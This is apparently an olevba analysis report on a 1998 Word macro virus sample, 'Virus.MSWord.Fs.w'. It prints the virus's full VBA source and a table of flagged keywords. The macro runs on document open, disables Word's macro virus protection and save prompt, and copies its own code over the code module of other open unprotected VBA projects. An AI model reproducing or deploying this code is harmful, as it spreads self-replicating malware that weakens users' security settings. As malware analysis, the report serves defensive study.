olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.w
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.w - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Shove
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.EnableCancelKey = 0
With ThisDocument.VBProject.VBComponents(1).CodeModule
ι = .Lines(1, .CountOfLines)
.DeleteLines 1, .CountOfLines: End With
�: Set α = VBE.VBProjects(Int(Rnd() * VBE.VBProjects.Count + 1))
If α.Protection <> 1 Then
With α.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString ι
Exit Sub: End With: End If: GoTo �
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

